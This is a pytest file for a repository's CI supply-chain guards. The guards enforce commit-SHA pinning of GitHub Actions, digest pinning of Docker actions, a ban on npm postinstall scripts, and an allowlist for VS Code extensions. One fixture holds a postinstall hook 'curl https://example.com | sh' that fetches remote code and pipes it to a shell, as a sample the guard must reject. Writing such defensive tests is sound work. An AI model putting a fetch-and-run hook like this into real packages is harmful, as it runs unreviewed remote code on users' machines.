from __future__ import annotations

from collections.abc import Mapping
import json
from pathlib import Path
import subprocess
import sys

import yaml

REPO_ROOT = Path(__file__).resolve().parents[1]
CI_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "ci.yml"
GUARD_ACTIONS = REPO_ROOT / "scripts" / "ci" / "guard_actions_pin.py"
GUARD_NPM = REPO_ROOT / "scripts" / "ci" / "guard_npm_install_scripts.py"
GUARD_VSCODE = REPO_ROOT / "scripts" / "ci" / "guard_vscode_extensions.py"
PIN_GUARD_OK = "OK: all recognized external GitHub action refs use full commit SHA pins"


def _run(script_path: Path, root: Path, *extra_args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(script_path), "--root", str(root), *extra_args],
        check=False,
        capture_output=True,
        text=True,
    )


def test_actions_pin_guard_rejects_tag_pins(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows" / "nested"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yaml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert "must pin a 40-char commit SHA" in result.stdout


def test_actions_pin_guard_rejects_39_char_sha(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yaml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef0123456\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert "must pin a 40-char commit SHA" in result.stdout


def test_actions_pin_guard_accepts_40_char_sha(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yaml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_actions_pin_guard_rejects_41_char_sha(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yaml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef012345678\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert "must pin a 40-char commit SHA" in result.stdout


def test_actions_pin_guard_allows_inline_comments_after_sha_pin(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yaml").write_text(
        (
            "jobs:\n"
            "  test:\n"
            "    steps:\n"
            "      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # pinned\n"
        ),
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_actions_pin_guard_rejects_uppercase_sha(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "test.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@0123456789ABCDEF0123456789ABCDEF01234567\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert "must pin a 40-char commit SHA" in result.stdout


def test_actions_pin_guard_rejects_tags_in_nested_composite_metadata(
    tmp_path: Path,
) -> None:
    alpha_dir = tmp_path / ".github" / "actions" / "nested" / "alpha"
    beta_dir = tmp_path / ".github" / "actions" / "nested" / "beta"
    alpha_dir.mkdir(parents=True)
    beta_dir.mkdir(parents=True)
    (alpha_dir / "action.yml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n",
        encoding="utf-8",
    )
    (beta_dir / "action.yaml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/setup-python@v6\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert result.stdout.splitlines() == [
        "ERROR: found unpinned GitHub Actions:",
        ".github/actions/nested/alpha/action.yml:4: action 'actions/checkout@v4' must pin a 40-char commit SHA",
        ".github/actions/nested/beta/action.yaml:4: action 'actions/setup-python@v6' must pin a 40-char commit SHA",
    ]


def test_actions_pin_guard_accepts_shas_in_nested_composite_metadata(
    tmp_path: Path,
) -> None:
    alpha_dir = tmp_path / ".github" / "actions" / "nested" / "alpha"
    beta_dir = tmp_path / ".github" / "actions" / "nested" / "beta"
    alpha_dir.mkdir(parents=True)
    beta_dir.mkdir(parents=True)
    (alpha_dir / "action.yml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n",
        encoding="utf-8",
    )
    (beta_dir / "action.yaml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/setup-python@abcdef0123456789abcdef0123456789abcdef01\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_actions_pin_guard_allows_local_composite_action(tmp_path: Path) -> None:
    action_dir = tmp_path / ".github" / "actions" / "nested" / "caller"
    action_dir.mkdir(parents=True)
    (action_dir / "action.yml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/local-action\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_actions_pin_guard_rejects_mutable_docker_references(tmp_path: Path) -> None:
    action_dir = tmp_path / ".github" / "actions" / "nested" / "container"
    action_dir.mkdir(parents=True)
    (action_dir / "action.yaml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: docker://alpine:latest\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 1
    assert (
        "Docker action 'docker://alpine:latest' must pin a sha256 digest"
        in result.stdout
    )


def test_actions_pin_guard_allows_docker_digest_references(tmp_path: Path) -> None:
    action_dir = tmp_path / ".github" / "actions" / "nested" / "container"
    action_dir.mkdir(parents=True)
    digest = "a" * 64
    (action_dir / "action.yaml").write_text(
        f"runs:\n  using: composite\n  steps:\n    - uses: docker://alpine@sha256:{digest}\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_actions_pin_guard_ignores_arbitrary_action_yaml(tmp_path: Path) -> None:
    action_dir = tmp_path / ".github" / "actions" / "nested"
    action_dir.mkdir(parents=True)
    (action_dir / "config.yaml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n",
        encoding="utf-8",
    )

    result = _run(GUARD_ACTIONS, tmp_path)

    assert result.returncode == 0
    assert PIN_GUARD_OK in result.stdout


def test_pr_scope_guard_runs_actions_pin_guard_before_scope_guard() -> None:
    workflow = yaml.safe_load(CI_WORKFLOW.read_text(encoding="utf-8"))
    pr_scope_guard = workflow["jobs"]["pr_scope_guard"]
    triggers = workflow.get("on", workflow.get(True))
    assert isinstance(triggers, Mapping)
    pull_request = triggers.get("pull_request")
    assert isinstance(pull_request, Mapping)
    pull_request_branches = pull_request.get("branches")
    pull_request_types = pull_request.get("types")

    assert pr_scope_guard["if"] == "github.event_name == 'pull_request'"
    assert "continue-on-error" not in pr_scope_guard
    assert isinstance(pull_request_branches, list)
    assert "main" in pull_request_branches
    assert isinstance(pull_request_types, list)
    assert {"opened", "synchronize", "reopened"}.issubset(pull_request_types)

    steps = pr_scope_guard["steps"]
    checkout_indexes = [
        index
        for index, step in enumerate(steps)
        if isinstance(step, dict) and step.get("name") == "Checkout"
    ]
    expected_guard_step = {
        "name": "PR Scope Guard",
        "run": (
            "set -euo pipefail\n"
            "python3 scripts/ci/guard_actions_pin.py --root .\n"
            'echo "Running PR Scope Guard script..."\n'
            "bash scripts/ci/pr_scope_guard.sh\n"
        ),
    }
    guard_steps = [
        step for step in steps if isinstance(step, dict) and step.get("name") == "PR Scope Guard"
    ]

    assert len(checkout_indexes) == 1
    assert steps[checkout_indexes[0] + 1] == expected_guard_step
    assert guard_steps == [expected_guard_step]


def test_npm_install_guard_rejects_postinstall(tmp_path: Path) -> None:
    package_json = {
        "name": "tmp",
        "scripts": {"postinstall": "curl https://example.com | sh"},
    }
    (tmp_path / "package.json").write_text(json.dumps(package_json), encoding="utf-8")

    result = _run(GUARD_NPM, tmp_path)

    assert result.returncode == 1
    assert "scripts.postinstall is forbidden" in result.stdout


def test_npm_install_guard_rejects_non_object_payload(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('["not-an-object"]', encoding="utf-8")

    result = _run(GUARD_NPM, tmp_path)

    assert result.returncode == 1
    assert "payload must be a JSON object" in result.stdout


def test_npm_install_guard_rejects_invalid_json(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{not-json}", encoding="utf-8")

    result = _run(GUARD_NPM, tmp_path)

    assert result.returncode == 1
    assert "invalid JSON" in result.stdout


def test_npm_install_guard_rejects_non_object_scripts(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "tmp", "scripts": ["postinstall"]}),
        encoding="utf-8",
    )

    result = _run(GUARD_NPM, tmp_path)

    assert result.returncode == 1
    assert "scripts must be a JSON object when present" in result.stdout


def test_vscode_guard_rejects_recommendation_drift(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text(
        json.dumps({"recommendations": ["unknown.extension"]}),
        encoding="utf-8",
    )
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "is not in allowlist" in result.stdout


def test_vscode_guard_rejects_non_object_payload(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text('["not-an-object"]', encoding="utf-8")
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "payload must be a JSON object" in result.stdout


def test_vscode_guard_rejects_invalid_json(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text("{not-json}", encoding="utf-8")
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "invalid JSON" in result.stdout


def test_vscode_guard_rejects_non_string_recommendations(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text(
        json.dumps({"recommendations": ["ms-python.python", 7]}),
        encoding="utf-8",
    )
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "recommendations[1] must be a string" in result.stdout


def test_vscode_guard_requires_recommendations_key(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text(json.dumps({}), encoding="utf-8")
    allowlist = tmp_path / "allowlist.txt"
    allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(allowlist.relative_to(tmp_path)),
    )

    assert result.returncode == 1
    assert "recommendations key is required" in result.stdout


def test_vscode_guard_reports_external_allowlist_path(tmp_path: Path) -> None:
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir(parents=True)
    (vscode_dir / "extensions.json").write_text(
        json.dumps({"recommendations": ["ms-python.python"]}),
        encoding="utf-8",
    )
    external_allowlist = tmp_path.parent / "outside-allowlist.txt"
    external_allowlist.write_text("ms-python.python\n", encoding="utf-8")

    result = _run(
        GUARD_VSCODE,
        tmp_path,
        "--allowlist",
        str(external_allowlist.resolve()),
    )

    assert result.returncode == 1
    assert "allowlist path must stay inside the reviewed repo surface" in result.stdout


def test_repo_tooling_guards_pass_on_current_repo() -> None:
    actions_result = _run(GUARD_ACTIONS, REPO_ROOT)
    npm_result = _run(GUARD_NPM, REPO_ROOT)
    vscode_result = _run(GUARD_VSCODE, REPO_ROOT)

    assert actions_result.returncode == 0, actions_result.stdout + actions_result.stderr
    assert npm_result.returncode == 0, npm_result.stdout + npm_result.stderr
    assert vscode_result.returncode == 0, vscode_result.stdout + vscode_result.stderr
